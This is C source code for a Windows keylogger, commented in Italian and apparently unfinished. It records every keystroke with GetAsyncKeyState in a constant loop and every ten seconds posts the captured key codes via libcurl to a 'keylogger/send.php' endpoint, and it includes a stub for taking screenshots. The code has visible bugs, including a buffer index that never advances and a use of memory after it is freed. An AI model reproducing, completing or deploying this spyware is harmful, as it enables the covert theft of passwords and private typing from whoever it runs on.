#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <unistd.h>
#include "curl/curl.h"

#define BUFFERLEN 1024

void ScreenCapture(int width, int height)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	
	// convertire in PNG e inviare via curl
	
	DeleteObject(hBmp);
}

int curl(char *parameter)
{
  CURL *curl;
  CURLcode res;
  char par[50];
  strcpy(par,"input=");
  
  FILE *fptr = fopen("log.dat", "wb");
  //fprintf(fptr,"\nparameter: %s ", strcat(par,parameter));

  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {
  	curl_easy_setopt(curl, CURLOPT_WRITEDATA, fptr); 
    /* First set the URL that is about to receive our POST. This URL can
       just as well be a https:// URL if that is what should receive the
       data. */
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:80/keylogger/send.php");
    /* Now specify the POST data */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, strcat(par,parameter));

    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK){
		//fprintf(fptr, "\ncurl_easy_perform() failed: %s", curl_easy_strerror(res));
	}
    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  
  free(parameter);
  fclose(fptr);
  
  return 0;	
}

/*
void saveLog()
{
	FILE *log;
	unsigned int p;
	
	log = fopen("log", "a+");
	for (p = 0; p < ptr; p++)
	{
		fprintf(log, "%02X,", buffer[p]);
	}
	
	fclose(log);
}
*/

DWORD WINAPI ThreadFunc(void *data)
{
	//saveLog();
}

/*
void saveKey(unsigned int keyCode)
{
	buffer[ptr++] = keyCode;
}
*/

void reportError() {
	
}

void RawInput()
{
	clock_t start_t, end_t, timer;
	unsigned int i = 0; // indice per scorrere i virtual key code
	unsigned int bufferIndex = 0; // indice buffer
	unsigned int bufferSize = BUFFERLEN;	// lunghezza iniziale del buffer
	unsigned char *buffer = (char*)malloc(sizeof(char)*bufferSize); // alloco memoria per il buffer
	char *tmpBuffer;
	int key;
	start_t = 0;
	
	while(1) {
		for(i = 0; i<256; i++) {
			key = GetAsyncKeyState(i);
			if(key > 0) // se clicco almeno un tasto da tastiera
			{	
			 	buffer[bufferIndex] = i; // inizio a riempire il buffer solo se clicco da tastiera
				if ( bufferIndex >= bufferSize )
				{
					bufferSize *= 2; // raddoppio la grandezza del buffer
					buffer = realloc(buffer, bufferSize);
					if (buffer == NULL)
						reportError();
				}
			}
		}
		end_t = clock();
		timer = (end_t-start_t);
		if(timer >= 10000) { // se sono passati 10 secondi
			// request curl per salvare sul database
			// Integration curl() function execute thread
			// TODO: ...
			tmpBuffer = (char*)malloc(sizeof(char)*bufferSize);
			memcpy(tmpBuffer,buffer,bufferSize);
			curl(tmpBuffer);
			free(buffer);
			bufferSize = BUFFERLEN;
			start_t = end_t;
		}
		Sleep(1);
	}
}


int main(void)
{	
	// debug
	//ScreenCapture(800, 600); // catturo lo snapshot della schermata corrente
//	curl(); // invio i dati recepiti da tastiera mediante una chiamata in curl
	RawInput(); // catturo l'input da tastiera
	return 0;
}
